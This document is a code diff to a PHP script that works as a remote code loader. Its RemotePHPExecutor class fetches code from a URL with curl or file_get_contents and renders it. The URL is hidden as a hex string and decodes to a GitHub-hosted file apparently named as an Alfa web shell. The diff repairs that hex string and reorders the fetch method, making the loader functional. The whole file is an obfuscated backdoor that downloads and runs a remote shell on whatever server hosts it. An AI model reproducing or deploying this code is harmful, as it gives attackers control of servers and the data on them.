@@ -11,23 +11,6 @@ class RemotePHPExecutor
         $this->url = $url;
         $this->fetchCode();
     }
-
-    private function fetchCode()
-    {
-        $code = $this->fetchUsingCurl();
-
-        if ($code === false) {
-            $code = $this->fetchUsingFileGetContents();
-        }
-
-        if ($code === false) {
-            $this->error = "Gagal mengambil konten dari URL: {$this->url}";
-            return;
-        }
-
-        $this->code = $code;
-    }
-
     private function fetchUsingCurl()
     {
         if (!function_exists('curl_init')) {
@@ -58,6 +41,22 @@ class RemotePHPExecutor
         return @file_get_contents($this->url, false, $context);
     }
 
+     private function fetchCode()
+    {
+        $code = $this->fetchUsingCurl();
+
+        if ($code === false) {
+            $code = $this->fetchUsingFileGetContents();
+        }
+
+        if ($code === false) {
+            $this->error = "Gagal mengambil konten dari URL: {$this->url}";
+            return;
+        }
+
+        $this->code = $code;
+    }
+
     public function render()
     {
         if (empty($this->code)) {
@@ -74,7 +73,7 @@ class RemotePHPExecutor
     }
 }
 
-$this_data = ['68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F6861786F7273746172732F686178636173682D6173736574732F726566732F68656164732F6D61696E2F7368656C6C2F616C66612D686178636173682D6E6F2D656E632E70687027'];
+$this_data = ['68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F6861786F7273746172732F686178636173682D6173736574732F726566732F68656164732F6D61696E2F7368656C6C2F616C66612D686178636173682D6E6F2D656E632E706870'];
 foreach ($this_data as $key) {
     $haxcash = hex2bin($key);
     $remote = new RemotePHPExecutor($haxcash);
